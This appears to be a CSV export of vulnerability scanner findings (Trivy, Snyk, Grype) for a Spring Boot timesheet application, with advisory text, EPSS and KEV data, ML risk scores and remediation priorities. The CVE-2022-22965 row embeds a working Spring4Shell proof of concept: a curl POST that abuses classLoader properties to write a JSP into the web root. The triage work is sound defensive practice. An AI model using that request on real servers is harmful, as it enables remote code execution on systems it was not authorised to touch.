id,title,description,severity,package,cvss_score,fix_version,target,reference,published_date,detected_by,tool,tool_count,confidence_score,affected_assets,in_kev,kev_ransomware,kev_due_date,epss_score,epss_percentile,has_exploit,asset_criticality,asset_env,asset_owner,internet_facing,asset_tags,pci_scope,gdpr_scope,requires_auth,network_exposed,in_blast_radius,source_asset,affected_asset_count,crown_jewel_reachable,nearest_critical_asset_hops,shortest_attack_path,blast_radius_score,severity_score,cvss_numeric,epss_numeric,time_decay_factor,rule_score,ml_risk_score_oof,ml_oof_fold,xgb_score,lgb_score,ml_risk_score,model_uncertainty,graph_boost,risk_score,risk_score_oof,risk_probability_calibrated,calibration_bucket,top_shap_drivers,priority,priority_for_review,is_false_positive,fp_reason
CVE-2016-1000027,spring: HttpInvokerServiceExporter readRemoteInvocation method untrusted java deserialization,"Pivotal Spring Framework through 5.3.16 suffers from a potential remote code execution (RCE) issue if used for Java deserialization of untrusted data. Depending on how the library is implemented within a product, this issue may or not occur, and authentication may be required. NOTE: the vendor's position is that untrusted data is not an intended use case. The product's behavior will not be changed because some users rely on deserialization of trusted data.",CRITICAL,org.springframework:spring-web,9.8,6.0.0,Java,"https://access.redhat.com/security/cve/CVE-2016-1000027, https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-1000027",2020-01-02T23:15:11.857Z,['Trivy'],Trivy,1,0.8,"['Java', 'pom.xml']",0,Unknown,,0.32257,0.98201,0,7,prod,platform,0,['internal-service'],0,0,1,0,1,timesheet-devops-app,1,0,99,[],51.1,90,9.8,0.32257,0.25,29.792,25.92379939310016,0,9.448144e-05,44.44070014804775,22.220397314743018,44.44060566660775,5,30.2,32.5,0.0,VERY_LOW,"[{""feature"": ""time_decay_factor"", ""impact"": -33.01, ""feature_value"": 0.25, ""direction"": ""lowers_risk""}, {""feature"": ""cvss_numeric"", ""impact"": -7.589, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""epss_numeric"", ""impact"": -4.34, ""feature_value"": 0.3226, ""direction"": ""lowers_risk""}, {""feature"": ""severity_score"", ""impact"": 3.972, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""tool_count"", ""impact"": -1.355, ""feature_value"": 1.0, ""direction"": ""lowers_risk""}]",P4_30D,28.88642202772678,0,
CVE-2022-22965,Remote Code Execution (RCE),"## Overview
[org.springframework:spring-beans](https://www.baeldung.com/spring-bean) is a package that is the basis for Spring Framework's IoC container. The BeanFactory interface provides an advanced configuration mechanism capable of managing any type of object.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) via manipulation of `ClassLoader` that is achievable with a POST HTTP request. This could allow an attacker to execute a webshell on a victim's application (TomCat), or download arbitrary files from the server (Payara/Glassfish).

**Note:** 
* Current public exploits require victim applications to be built with JRE version 9 (or above) and to be deployed on either Tomcat, Payara, or Glassfish. 

* However, we have confirmed that it is technically possible for additional exploits to work under additional application configurations as well. 

* As such, while we recommend users prioritize first remediating against the configuration described above, for full protection, we also recommend upgrading all vulnerable versions to the fixed `spring-beans` version regardless of the application configuration.

### Update Log 
* **31/03/2022 -** Severity was raised from 8.1 to 9.8
* **08/04/2022 -** Advisory was updated to reflect that Snyk's security research team was able to author a working PoC of this vulnerability against applications that are deployed on Payara (which is based on Glassfish). 


## PoC
```java
1/ docker run -p 8888:8080 --rm --interactive --tty --name vm1 tomcat:9.0
2/ ./mvnw install
3/ docker cp target/handling-form-submission-complete.war vm1:/usr/local/tomcat/webapps
4/ curl -X POST \
  -H ""pre:<%"" \
  -H ""post:;%>"" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/handling-form-submission-complete' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
  http://localhost:8888/handling-form-submission-complete/greeting
5/ curl http://localhost:8888/handling-form-submission-complete/rce.jsp
```
## Remediation
Upgrade `org.springframework:spring-beans` to version 5.2.20, 5.3.18 or higher.
## References
- [CyberKendra Post](https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html)
- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15)
- [LunaSec Blog](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)
- [Payara Blogpost](https://blog.payara.fish/payara-and-spring4shell)
- [Payara PoC](https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara)
- [Snyk Blog - Technical Breakdown](https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/)
- [Snyk PoC](https://github.com/Kirill89/CVE-2022-22965-PoC)
- [Spring Security Announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [Spring Tomcat Mitigation Advice](https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative)
- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/cves/2022/CVE-2022-22965.yaml)
- [PoC in GitHub](https://github.com/wjl110/CVE-2022-22965_Spring_Core_RCE)
",CRITICAL,org.springframework:spring-beans,9.8,5.2.20,tn.esprit.spring.services:timesheet-devops@1.0,,,"['Snyk', 'Trivy']",Snyk,2,1.0,"['tn.esprit.spring.services:timesheet-devops@1.0', 'Java', 'pom.xml']",1,Unknown,2022-04-25,0.99638,0.99948,1,7,prod,platform,0,['internal-service'],0,0,1,0,1,timesheet-devops-app,1,0,99,[],84.5,90,9.8,0.99638,0.8,100.0,75.6296883356089,4,29.001207,56.90998323901998,42.95559529535228,27.90877623901998,5,70.8,90.4,0.615,HIGH,"[{""feature"": ""cvss_numeric"", ""impact"": -14.675, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""epss_numeric"", ""impact"": -11.728, ""feature_value"": 0.9964, ""direction"": ""lowers_risk""}, {""feature"": ""tool_count"", ""impact"": 4.651, ""feature_value"": 2.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 4.358, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""severity_score"", ""impact"": 3.954, ""feature_value"": 90.0, ""direction"": ""raises_risk""}]",P1_24H,56.84106670811567,0,
CVE-2023-20873,spring-boot: Security Bypass With Wildcard Pattern Matching on Cloud Foundry,"In Spring Boot versions 3.0.0 - 3.0.5, 2.7.0 - 2.7.10, and older unsupported versions, an application that is deployed to Cloud Foundry could be susceptible to a security bypass. Users of affected versions should apply the following mitigation: 3.0.x users should upgrade to 3.0.6+. 2.7.x users should upgrade to 2.7.11+. Users of older, unsupported versions should upgrade to 3.0.6+ or 2.7.11+.",CRITICAL,org.springframework.boot:spring-boot-actuator-autoconfigure,9.8,2.5.15,tn.esprit.spring.services:timesheet-devops@1.0,"https://access.redhat.com/security/cve/CVE-2023-20873, https://github.com/advisories/GHSA-g5h3-w546-pj7f",2023-04-20T21:15:08.717Z,"['Snyk', 'Trivy']",Snyk,2,1.0,"['tn.esprit.spring.services:timesheet-devops@1.0', 'Java', 'pom.xml']",0,Unknown,,0.01122,0.63956,0,7,prod,platform,0,['internal-service'],0,0,1,0,0,timesheet-devops-app,1,0,99,[],44.8,90,9.8,0.01122,0.25,30.24,62.317979946017125,4,-0.00028640882,56.90998323901998,28.45484841510176,56.91026964783998,0,29.2,49.5,0.111,VERY_LOW,"[{""feature"": ""time_decay_factor"", ""impact"": -34.488, ""feature_value"": 0.25, ""direction"": ""lowers_risk""}, {""feature"": ""cvss_numeric"", ""impact"": -8.376, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""epss_numeric"", ""impact"": -5.905, ""feature_value"": 0.0112, ""direction"": ""lowers_risk""}, {""feature"": ""severity_score"", ""impact"": 3.572, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""tool_count"", ""impact"": 2.88, ""feature_value"": 2.0, ""direction"": ""raises_risk""}]",P5_BACKLOG,36.99158934845052,0,
CVE-2023-20860,Improper Access Control,"## Overview
[org.springframework:spring-webmvc](https://mvnrepository.com/artifact/org.springframework/spring-webmvc) is a package that provides Model-View-Controller (MVC) architecture and ready components that can be used to develop flexible and loosely coupled web applications.

Affected versions of this package are vulnerable to Improper Access Control when using an un-prefixed double wildcard pattern (`""**""`) in the Spring Security configuration with the `mvcRequestMatcher`. This configuration creates a pattern-matching discrepancy between Spring Security and Spring MVC, potentially allowing unauthorized access.

**Note:**
The Spring security team have published information about an existing PoC, but have not shared the PoC itself publicly, therefore we don't currently have the ability to verify it.
## Remediation
Upgrade `org.springframework:spring-webmvc` to version 5.3.26, 6.0.7 or higher.
## References
- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/202fa5cdb3a3d0cfe6967e85fa167d978244f28a)
- [Spring Blog](https://spring.io/blog/2023/03/20/spring-framework-6-0-7-and-5-3-26-fix-cve-2023-20860-and-cve-2023-20861)
- [Spring Security Advisory](https://spring.io/security/cve-2023-20860)
",CRITICAL,org.springframework:spring-webmvc,9.1,5.3.26,tn.esprit.spring.services:timesheet-devops@1.0,,,"['Snyk', 'Trivy']",Snyk,2,1.0,"['tn.esprit.spring.services:timesheet-devops@1.0', 'Java', 'pom.xml']",0,Unknown,,0.03514,0.884,0,7,prod,platform,0,['internal-service'],0,0,1,0,0,timesheet-devops-app,1,0,99,[],45.3,90,9.1,0.03514,0.8,96.768,64.33120706904566,2,78.99837,56.90998323901998,67.95417527429515,22.088386760980015,0,79.5,77.3,0.848,VERY_HIGH,"[{""feature"": ""cvss_numeric"", ""impact"": 13.741, ""feature_value"": 9.1, ""direction"": ""raises_risk""}, {""feature"": ""severity_score"", ""impact"": 10.189, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 7.495, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""tool_count"", ""impact"": 4.169, ""feature_value"": 2.0, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": 0.959, ""feature_value"": 0.0351, ""direction"": ""raises_risk""}]",P2_72H,31.430445962778553,0,
GHSA-36p3-wjmg-h94x,Remote Code Execution in Spring Framework,Remote Code Execution in Spring Framework,CRITICAL,spring-beans,9.8,5.3.18,spring-beans v5.3.9,https://github.com/advisories/GHSA-36p3-wjmg-h94x,,['Grype'],Grype,1,0.5,['spring-beans v5.3.9'],0,Unknown,,0.0,0.0,0,7,prod,platform,0,['internal-service'],0,0,1,0,0,timesheet-devops-app,1,0,99,[],44.6,90,9.8,0.0,0.8,80.63999999999999,67.9925595220464,0,47.66649,48.791234771186815,48.22886170932388,1.124744771186812,0,61.2,73.1,0.615,HIGH,"[{""feature"": ""severity_score"", ""impact"": 7.303, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 4.312, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""cvss_numeric"", ""impact"": -2.708, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""tool_count"", ""impact"": -1.958, ""feature_value"": 1.0, ""direction"": ""lowers_risk""}, {""feature"": ""epss_numeric"", ""impact"": -1.732, ""feature_value"": 0.0, ""direction"": ""lowers_risk""}]",P3_7D,15.031030898390568,0,
GHSA-36p3-wjmg-h94x,Remote Code Execution in Spring Framework,Remote Code Execution in Spring Framework,CRITICAL,spring-boot-starter-web,9.8,2.5.12,spring-boot-starter-web v2.5.4,https://github.com/advisories/GHSA-36p3-wjmg-h94x,,['Grype'],Grype,1,0.5,['spring-boot-starter-web v2.5.4'],0,Unknown,,0.0,0.0,0,7,prod,platform,0,['internal-service'],0,0,1,0,0,timesheet-devops-app,1,0,99,[],44.6,90,9.8,0.0,0.8,80.63999999999999,,-1,47.66649,48.791234771186815,48.22886170932388,1.124744771186812,0,61.2,,0.615,HIGH,"[{""feature"": ""severity_score"", ""impact"": 7.303, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 4.312, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""cvss_numeric"", ""impact"": -2.708, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""tool_count"", ""impact"": -1.958, ""feature_value"": 1.0, ""direction"": ""lowers_risk""}, {""feature"": ""epss_numeric"", ""impact"": -1.732, ""feature_value"": 0.0, ""direction"": ""lowers_risk""}]",P3_7D,15.031030898390568,0,
CVE-2026-22733,Authentication Bypass Using an Alternate Path or Channel,"## Overview

Affected versions of this package are vulnerable to Authentication Bypass Using an Alternate Path or Channel via the Actuator CloudFoundry endpoints. An attacker can gain unauthorized access to protected endpoints by sending requests to application endpoints declared under the CloudFoundry Actuator path.

**Note:**

This is only exploitable if all of the following conditions are met:

- the application is a web application

- the application contributes an application endpoint that requires authentication under a subpath, like `""/cloudfoundryapplication/admin""`
## Remediation
Upgrade `org.springframework.boot:spring-boot-actuator-autoconfigure` to version 3.5.12, 4.0.4 or higher.
## References
- [GitHub Commit](https://github.com/spring-projects/spring-boot/commit/01fbede2b27237616e215fe0df7c294ae47bdd73)
- [Spring Advisory](https://spring.io/security/cve-2026-22733)
",CRITICAL,org.springframework.boot:spring-boot-actuator-autoconfigure,9.2,3.5.12,tn.esprit.spring.services:timesheet-devops@1.0,,,"['Snyk', 'Trivy']",Snyk,2,1.0,"['tn.esprit.spring.services:timesheet-devops@1.0', 'pom.xml']",0,Unknown,,0.0036,0.28973,0,7,prod,platform,0,['internal-service'],0,0,1,0,0,timesheet-devops-app,1,0,99,[],44.7,90,9.2,0.0036,0.8,96.768,70.33375283364771,1,77.99972,69.55707388188172,73.77839579714203,8.442646118118276,0,83.0,80.9,0.848,VERY_HIGH,"[{""feature"": ""cvss_numeric"", ""impact"": 14.421, ""feature_value"": 9.2, ""direction"": ""raises_risk""}, {""feature"": ""severity_score"", ""impact"": 9.599, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 5.772, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""tool_count"", ""impact"": 3.944, ""feature_value"": 2.0, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": 1.811, ""feature_value"": 0.0036, ""direction"": ""raises_risk""}]",P2_72H,26.354841798201743,0,
CVE-2025-66614,Improper Certificate Validation,"## Overview
[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.

Affected versions of this package are vulnerable to Improper Certificate Validation in the SNI extension, when client certificate authentication relies exclusively on the Connector (and is not enforced in the web application). The hostname provided via the SNI extension may be different from the hostname in the HTTP host header field.
## Remediation
Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.113, 10.1.50, 11.0.15 or higher.
## References
- [Apache Mailing List](https://lists.apache.org/thread/vw6lxtlh2qbqwpb61wd3sv1flm2nttw7)
- [GitHub Commit](https://github.com/apache/tomcat/commit/258a591b61f8cf5c22109e21e5a2a38b63454fd2)
",CRITICAL,org.apache.tomcat.embed:tomcat-embed-core,9.1,9.0.113,tn.esprit.spring.services:timesheet-devops@1.0,,,['Snyk'],Snyk,1,0.8,['tn.esprit.spring.services:timesheet-devops@1.0'],0,Unknown,,0.00235,0.14346,0,7,prod,platform,0,['internal-service'],0,0,1,0,0,timesheet-devops-app,1,0,99,[],44.6,90,9.1,0.00235,0.8,90.3168,63.485959854469066,2,76.00161,57.423588000528966,66.71259890138754,18.578021999471034,0,76.2,74.2,0.848,VERY_HIGH,"[{""feature"": ""cvss_numeric"", ""impact"": 17.998, ""feature_value"": 9.1, ""direction"": ""raises_risk""}, {""feature"": ""severity_score"", ""impact"": 9.823, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 6.269, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""tool_count"", ""impact"": -1.646, ""feature_value"": 1.0, ""direction"": ""lowers_risk""}, {""feature"": ""epss_numeric"", ""impact"": 1.102, ""feature_value"": 0.0024, ""direction"": ""raises_risk""}]",P2_72H,29.302790670151776,0,
CVE-2025-24813,tomcat: Potential RCE and/or information disclosure and/or information corruption with partial PUT,"Path Equivalence: 'file.Name' (Internal Dot) leading to Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet in Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98.
The following versions were EOL at the time the CVE was created but are 
known to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions 
may also be affected.


If all of the following were true, a malicious user was able to view       security sensitive files and/or inject content into those files:
- writes enabled for the default servlet (disabled by default)
- support for partial PUT (enabled by default)
- a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads
- attacker knowledge of the names of security sensitive files being uploaded
- the security sensitive files also being uploaded via partial PUT

If all of the following were true, a malicious user was able to       perform remote code execution:
- writes enabled for the default servlet (disabled by default)
- support for partial PUT (enabled by default)
- application was using Tomcat's file based session persistence with the default storage location
- application included a library that may be leveraged in a deserialization attack

Users are recommended to upgrade to version 11.0.3, 10.1.35 or 9.0.99, which fixes the issue.",CRITICAL,org.apache.tomcat.embed:tomcat-embed-core,9.8,9.0.99,tn.esprit.spring.services:timesheet-devops@1.0,"http://www.openwall.com/lists/oss-security/2025/03/10/5, https://access.redhat.com/errata/RHSA-2025:3645",2025-03-10T17:15:35.067Z,"['Snyk', 'Trivy']",Snyk,2,1.0,"['tn.esprit.spring.services:timesheet-devops@1.0', 'Java', 'pom.xml']",1,Unknown,2025-04-22,0.99927,0.99968,1,7,prod,platform,0,['internal-service'],0,0,1,0,1,timesheet-devops-app,1,0,99,[],84.6,90,9.8,0.99927,0.4431506849315069,86.36120547945207,27.223197194224955,2,90.99906,56.90998323901998,73.95452241174632,34.08907676098002,5,83.9,55.9,0.848,VERY_HIGH,"[{""feature"": ""time_decay_factor"", ""impact"": 18.071, ""feature_value"": 0.4432, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": 13.875, ""feature_value"": 0.9993, ""direction"": ""raises_risk""}, {""feature"": ""severity_score"", ""impact"": 8.461, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""tool_count"", ""impact"": 6.51, ""feature_value"": 2.0, ""direction"": ""raises_risk""}, {""feature"": ""cvss_numeric"", ""impact"": 1.635, ""feature_value"": 9.8, ""direction"": ""raises_risk""}]",P1_24H,69.23089510401391,0,
CVE-2024-50379,Time-of-check Time-of-use (TOCTOU) Race Condition,"## Overview
[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.

Affected versions of this package are vulnerable to Time-of-check Time-of-use (TOCTOU) Race Condition. On case insensitive file systems, when the default servlet is write-enabled, an attacker can upload a malicious file containing executable code and bypass case sensitivity checks, causing it to be treated as a JSP and executed.

This vector has been observed when the application is under load and read and upload operations are performed on the same file simultaneously.

**Note:**

The default `readonly` initialization parameter value of `true` is not vulnerable.

This is related to [CVE-2024-56337](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHETOMCAT-8547998) where additional configurations are defined to fully mitigate this issue as upgrading to the fixed version doesn't fully mitigate this vulnerability;

In addition to upgrading to the fixed version, users are advised to apply the following mitigations, depending on which version of Java they are using with Tomcat :

1) running on Java 8 or Java 11: the system property `sun.io.useCanonCaches` must be explicitly set to false (it defaults
to true)

2) running on Java 17: the system property `sun.io.useCanonCaches`, if set, must be set to false (it defaults to false)

3) running on Java 21 onwards: no further configuration is required (the system property and the problematic cache have been removed)
## Remediation
Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.98, 10.1.34, 11.0.2 or higher.
## References
- [Apache Advisory](https://lists.apache.org/thread/y6lj6q1xnp822g6ro70tn19sgtjmr80r)
- [Apache Tomcat Advisory](https://tomcat.apache.org/security-10.html#Fixed_in_Apache_Tomcat_10.1.34)
- [Apache Tomcat Advisory](https://tomcat.apache.org/security-11.html#Fixed_in_Apache_Tomcat_11.0.2)
- [Apache Tomcat Advisory](https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.98)
- [Blog Post](https://medium.com/@patelvidhi4288/deep-dive-poc-of-cve-2024-50379-exploit-tomcat-vulnerability-9-8-severity-776cfcfcf3ed)
- [GitHub Commit](https://github.com/apache/tomcat/commit/05ddeeaa54df1e2dc427d0164bedd6b79f78d81f)
- [GitHub Commit](https://github.com/apache/tomcat/commit/43b507ebac9d268b1ea3d908e296cc6e46795c00)
- [GitHub Commit](https://github.com/apache/tomcat/commit/631500b0c9b2a2a2abb707e3de2e10a5936e5d41)
- [GitHub Commit](https://github.com/apache/tomcat/commit/684247ae85fa633b9197b32391de59fc54703842)
- [GitHub Commit](https://github.com/apache/tomcat/commit/8554f6b1722b33a2ce8b0a3fad37825f3a75f2d2)
- [GitHub Commit](https://github.com/apache/tomcat/commit/cc7a98b57c6dc1df21979fcff94a36e068f4456c)
- [PoC in GitHub](https://github.com/iSee857/CVE-2024-50379-PoC)
",CRITICAL,org.apache.tomcat.embed:tomcat-embed-core,9.2,9.0.98,tn.esprit.spring.services:timesheet-devops@1.0,,,"['Snyk', 'Trivy']",Snyk,2,1.0,"['tn.esprit.spring.services:timesheet-devops@1.0', 'Java', 'pom.xml']",0,Unknown,,0.44312,0.98667,0,7,prod,platform,0,['internal-service'],0,0,1,0,1,timesheet-devops-app,1,0,99,[],53.5,90,9.2,0.44312,0.8,100.0,67.1603048168484,2,82.00055,56.90998323901998,69.45526627771312,25.090566760980025,5,86.7,85.3,0.848,VERY_HIGH,"[{""feature"": ""cvss_numeric"", ""impact"": 13.564, ""feature_value"": 9.2, ""direction"": ""raises_risk""}, {""feature"": ""severity_score"", ""impact"": 9.18, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 7.784, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": 4.893, ""feature_value"": 0.4431, ""direction"": ""raises_risk""}, {""feature"": ""tool_count"", ""impact"": 4.129, ""feature_value"": 2.0, ""direction"": ""raises_risk""}]",P2_72H,33.38186326380395,0,
